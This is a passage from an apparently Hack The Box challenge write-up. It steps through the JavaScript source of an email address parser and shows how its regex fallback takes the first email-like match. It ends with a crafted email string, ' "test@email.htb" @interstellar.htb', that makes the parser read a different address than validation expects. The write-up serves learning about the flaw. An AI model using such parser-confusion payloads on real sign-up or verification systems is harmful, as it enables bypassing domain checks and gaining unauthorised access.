</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">prevToken</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">?</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="s1">&#39;operator&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">switch</span> <span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="s1">&#39;&lt;&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;address&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="s1">&#39;(&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;comment&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="s1">&#39;:&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;group&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">isGroup</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;text&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">state</span> <span class="o">===</span> <span class="s1">&#39;address&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// handle use case where unquoted name includes a &#34;&lt;&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// Apple Mail truncates everything between an unexpected &lt; and an address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// and so will we
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">token</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^[^&lt;]*&lt;\s*/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">prevToken</span> <span class="o">&amp;&amp;</span> <span class="nx">prevToken</span><span class="p">.</span><span class="nx">noBreak</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">].</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// join values
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">][</span><span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">].</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">data</span><span class="p">[</span><span class="nx">state</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// If there is no text but a comment, replace the two
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">comment</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="p">.</span><span class="nx">comment</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isGroup</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// http://tools.ietf.org/html/rfc2822#appendix-A.1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">addresses</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">name</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">||</span> <span class="p">(</span><span class="nx">address</span> <span class="o">&amp;&amp;</span> <span class="nx">address</span><span class="p">.</span><span class="nx">name</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="nx">group</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">group</span><span class="p">.</span><span class="nx">length</span> <span class="o">?</span> <span class="nx">addressparser</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">group</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">))</span> <span class="o">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// If no address was found, try to detect one from regular text
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^[^@\s]+@[^@\s]+$/</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">_regexHandler</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="p">[</span><span class="nx">address</span><span class="p">.</span><span class="nx">trim</span><span class="p">()];</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="nx">address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// still no address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">// fixed the regex to parse email address correctly when email address has more than one @
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\s*\b[^@\s]+@[^\s]+\b\s*/</span><span class="p">,</span> <span class="nx">_regexHandler</span><span class="p">).</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// If there&#39;s still is no text but a comment exixts, replace the two
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">comment</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="p">.</span><span class="nx">comment</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Keep only the first address occurence, push others to regular text
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Join values with spaces
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">&amp;&amp;</span> <span class="nx">isGroup</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">address</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">address</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">||</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">name</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span> <span class="o">||</span> <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">address</span><span class="p">.</span><span class="nx">address</span> <span class="o">===</span> <span class="nx">address</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">((</span><span class="nx">address</span><span class="p">.</span><span class="nx">address</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">match</span><span class="p">(</span><span class="sr">/@/</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">address</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">address</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">addresses</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">addresses</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><ul>
<li>I will explain this :
STEP 1: It create a data object to store all infomations we have.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">     <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">address</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">comment</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">group</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">text</span><span class="o">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span></code></pre></div><p>Step2 : Read the token and read the type of it to set the stage and decide where the following data pushed into the data list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">   <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">prevToken</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">?</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="s1">&#39;operator&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">switch</span> <span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="s1">&#39;&lt;&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;address&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="s1">&#39;(&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;comment&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="s1">&#39;:&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;group&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">isGroup</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;text&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><p>You can see it just check the &ldquo;&lt;&rdquo; at first to decide which one is address so our data wont be caught here!.
Then is some uninteresting features. Until this :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">   <span class="c1">// If no address was found, try to detect one from regular text
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//  This will run because we  dont use &lt; &gt; format
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^[^@\s]+@[^@\s]+$/</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">_regexHandler</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="p">[</span><span class="nx">address</span><span class="p">.</span><span class="nx">trim</span><span class="p">()];</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="nx">address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// still no address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// Here we step into this 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">// fixed the regex to parse email address correctly when email address has more than one @
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\s*\b[^@\s]+@[^\s]+\b\s*/</span><span class="p">,</span> <span class="nx">_regexHandler</span><span class="p">).</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">address</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><ul>
<li>Author comments make me know what to do here. If there isn&rsquo;t the address parsed, It will use regrex to find our email.</li>
<li>First regrex is :</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^[^@\s]+@[^@\s]+$/</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">data</span><span class="p">.</span><span class="nx">address</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><ul>
<li>Then test it : 
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rkWcS8YS1l.png" alt="image" />
    
  </figure>
</li>
<li>You can see that it just read the first pattern match email. This is the reason why our payload works !!!!</li>
<li>The last try will check the final regrex is :</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\s*\b[^@\s]+@[^\s]+\b\s*/</span><span class="p">,</span> <span class="nx">_regexHandler</span><span class="p">).</span><span class="nx">trim</span><span class="p">();</span>
</span></span></code></pre></div><p>It will find the pattern and call the callback which will push that pattern into the address !!!!</p>


<h1 class="relative group">LET&rsquo;S ANSWER THE QUESTIONS 
    <div id="lets-answer-the-questions" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#lets-answer-the-questions" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>The difference between  ?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">email</span> <span class="o">:</span><span class="s1">&#39; &#34;test@email.htb&#34; @interstellar.htb&#39;</span>
</span></span></code></pre></div><p>But this wont work ( JUST A SPACE )</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">email</span> <span class="o">:</span><span class="s1">&#39; &#34;test@email.htb&#34;@interstellar.htb&#39;</span>
